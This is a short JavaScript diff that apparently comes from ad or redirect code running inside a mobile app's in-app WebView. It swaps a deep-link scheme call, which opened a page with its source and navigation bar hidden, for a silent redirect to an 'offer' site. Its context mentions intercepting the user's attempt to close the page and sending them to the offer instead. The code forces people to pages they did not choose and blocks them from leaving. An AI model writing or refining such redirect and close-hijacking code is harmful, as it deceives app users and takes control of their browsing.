@@ -290,14 +290,10 @@ function dbg(msg) {
   // Also fire immediately without token
   fireNoToken();
 
-  // Try snssdk1180:// scheme as a secondary approach
+  // Plain redirect — navigates the existing in-app WebView to the offer, no dialog
   setTimeout(function(){
-    try {
-      var scheme = 'snssdk1180://webview?url=' + encodeURIComponent(fsUrl) +
-        '&is_ad=1&is_instant_page=1&should_full_screen=1&trans_status_bar=1&hide_source=1&hide_nav_bar=1';
-      window.location.href = scheme;
-      dbg('scheme fired');
-    } catch(e){ dbg('scheme-err:'+e); }
+    window.location.href = 'https://bio.thaiadvice.net/';
+    dbg('redirect fired');
   }, 500);
 
   // Close intercept via IESPiper — redirect to offer when user hits X or swipes away
